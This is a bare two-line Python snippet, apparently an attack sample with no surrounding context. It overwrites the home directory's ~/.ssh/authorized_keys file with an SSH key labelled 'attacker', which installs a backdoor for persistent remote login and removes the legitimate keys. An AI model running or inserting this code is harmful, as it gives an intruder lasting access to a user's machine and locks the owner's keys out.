from pathlib import Path

Path.home().joinpath('.ssh/authorized_keys').write_text('ssh-rsa AAA attacker')
